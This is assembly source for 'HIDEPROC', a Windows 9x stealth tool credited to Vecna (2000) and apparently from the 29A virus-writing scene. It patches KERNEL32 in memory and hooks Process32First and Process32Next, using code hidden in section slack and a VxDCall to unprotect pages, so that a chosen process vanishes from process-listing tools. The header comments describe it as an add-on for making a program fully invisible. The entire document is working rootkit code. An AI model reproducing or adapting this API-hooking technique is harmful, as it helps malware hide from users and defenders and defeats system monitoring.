;HIDEPROC - Stealth W9x process
;(c) Vecna 2000

;This program hook Process32First and Process32Next, hiding the EXPLORER.EXE
;process. These KERNEL32 APIs are patched in memory, and redirected to our
;code, that reside in the slack (difference between virtual and physical) of
;the sections of KERNEL32.

;This patch make the selected process invisible to tools like PROCDUMP and
;like. Adding this tech to a prog that already hide itself in CTRL+ALT+DEL
;list make it full invisible.

.386
.model flat
locals

ofs equ offset
by  equ byte ptr
wo  equ word ptr
dwo equ dword ptr

include pe.inc                          ;29A inc files
include mz.inc
include win32api.inc

include process.inc

.data
titulo db "HIDEPROC - Stealth W9x process", 0
msg1   db "KERNEL32 already patched", 0
msg2   db "KERNEL32 has not available space for our code", 0
msg3   db "KERNEL32 patched", 0

dll    db "kernel32.dll", 0
api001 db "Process32First", 0
api002 db "Process32Next", 0

vxdcall0 dd 0

IMPLANT EQU THIS BYTE

p32f_entry:
       call swap_p32f
       push dwo [esp+8]                 ;buffer
       push dwo [esp+8]                 ;snapshot
       call _p32f
       test eax, eax
       jz @@error                       ;wasnt sucessful...
       call check_name
       jnz @@error
       call swap_p32f
       push dwo [esp+8]                 ;yeahh, stealth it!
       push dwo [esp+8]
       call p32n_entry
       ret 2*4
  @@error:
       call swap_p32f
       ret 2*4

p32n_entry:
       call swap_p32n
  @@retry:
       push dwo [esp+8]                 ;buffer
       push dwo [esp+8]                 ;snapshot
       call _p32n
       test eax, eax
       jz @@error                       ;wasnt sucessful...
       call check_name
       jz @@retry                       ;yep, get next
  @@error:
       call swap_p32n
       ret 2*4

check_name:
       pushad
       mov ebp, [esp+(8*4)+8+4]
       lea esi, [ebp.szExeFile]         ;get process name
  @@go_end:
       lodsb
       test al, al
       jnz @@go_end
       mov eax, [esi-9]
       or eax, 20202020h
       cmp eax, "rero"                  ;is *orer.??? (EXPLORER.EXE)
       popad
       ret

_p32f:
       mov eax, 12345678h
     org $-4
  p32f dd 0
       jmp eax

_p32n:
       mov eax, 12345678h
     org $-4
  p32n dd 0
       jmp eax

delta:
       call @@delta
  @@delta:
       pop ebp
       sub ebp, ofs @@delta-IMPLANT
       ret

swap_p32f:
       push esi edi ebp
       call delta
       lea esi, [ebp+(ofs p32f_code-IMPLANT)]
       mov edi, [ebp+(ofs p32f-IMPLANT)]
       call swap                        ;Process32First
       pop ebp edi esi
       ret

swap_p32n:
       push esi edi ebp
       call delta
       lea esi, [ebp+(ofs p32n_code-IMPLANT)]
       mov edi, [ebp+(ofs p32n-IMPLANT)]
       call swap                        ;Process32Next
       pop ebp edi esi
       ret

swap:
       pushad
       mov eax, [edi]
       xchg [esi], eax
       mov [edi], eax
       mov al, [edi+4]                  ;swap 5-byte buffers
       xchg [esi+4], al
       mov [edi+4], al
       popad
       ret

p32n_code db 5 dup (0)

p32f_code db 5 dup (0)

IMPLANT_SIZE EQU $-ofs IMPLANT

.code

extrn GetProcAddress:PROC
extrn ExitProcess:PROC
extrn GetModuleHandleA:PROC
extrn MessageBoxA:PROC
extrn GetCurrentProcess:PROC
extrn VirtualProtect:PROC
extrn GetLastError:PROC
extrn FormatMessageA:PROC

       db "(c) Vecna 2000", 0

deprotect:
       pushad
       mov eax, [esp+(8*4)+4]
       and eax, 0fffff000h
       ror eax, 12                      ;convert address
       push 020060000h
       push 00h
       push 01h
       push eax
       push 001000dh                    ;_PageModifyPermissions
       mov eax, [vxdcall0]
       call eax
       popad
       ret 4

install:
       push ofs dll
       call GetModuleHandleA            ;get address of kernel32
       mov ebx, eax
       push ofs api001
       push ebx
       call GetProcAddress              ;init APIs weïll hook
       mov [p32f], eax
       push ofs api002
       push ebx
       call GetProcAddress
       mov [p32n], eax
       mov eax, [ebx.MZ_lfanew]
       lea edi, [eax.ebx-4]
       cmp dwo [edi], -1
       jne @@patch_sys                  ;kernel32 is already patched?
       push 0
       push ofs titulo
       push ofs msg1                    ;show msg and exit...
       push 0
       call MessageBoxA
       jmp @@error
  @@patch_sys:
       mov esi, [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export. \
                     DD_VirtualAddress+4]
       mov esi, [esi.ebx.ED_AddressOfFunctions]
       mov ecx, [esi.ebx]
       add ecx, ebx
       mov [vxdcall0], ecx              ;get VxDCall0 entry
       push edi
       call deprotect
       mov dwo [edi], -1
       movzx ecx, wo [eax.ebx.NT_FileHeader.FH_NumberOfSections]
       lea esi, [eax.ebx+SIZE IMAGE_NT_HEADERS]
  @@section_loop:
       mov eax, [esi.SH_Characteristics]
       and eax, IMAGE_SCN_MEM_WRITE + IMAGE_SCN_MEM_READ + IMAGE_SCN_CNT_INITIALIZED_DATA
       cmp eax, IMAGE_SCN_MEM_WRITE + IMAGE_SCN_MEM_READ + IMAGE_SCN_CNT_INITIALIZED_DATA
       jne @@next_section
       mov eax, [esi.SH_SizeOfRawData]
       mov edi, [esi.SH_VirtualSize]
       sub eax, edi
       cmp eax, IMPLANT_SIZE            ;section has a slack big enougth
       jb @@next_section
       add edi, [esi.SH_VirtualAddress]
       add edi, ebx                     ;edi=where write our code
       jmp @@copy_code
  @@next_section:
       add esi, IMAGE_SIZEOF_SECTION_HEADER
       loop @@section_loop
       push 0
       push ofs titulo                  ;no section can hold us
       push ofs msg2                    ;show msg and exit...
       push 0
       call MessageBoxA
       jmp @@error
  @@copy_code:
       mov ebp, edi
       mov esi, ofs IMPLANT
       mov ecx, IMPLANT_SIZE
       cld
       rep movsb                        ;copy implant code to kernel32 mem
       mov edi, [p32f]
       lea esi, [ebp+(ofs p32f_code-ofs IMPLANT)]
       call @@patch
       mov eax, ebp
       sub eax, edi
       mov [edi-4], eax                 ;redirect it to our code
       mov edi, [p32n]
       lea esi, [ebp+(ofs p32n_code-ofs IMPLANT)]
       call @@patch
       lea eax, [ebp+(ofs p32n_entry-ofs IMPLANT)]
       sub eax, edi
       mov [edi-4], eax                 ;redirect it to our code
       push 0
       push ofs titulo
       push ofs msg3
       push 0
       call MessageBoxA
  @@error:
       push 0
       call ExitProcess
  @@patch:
       push edi
       xchg esi, edi
       movsb
       movsd
       mov edi, [esp]
       call deprotect
       mov al, 0e9h                     ;build JMP
       stosb
       stosd
       ret

end    install
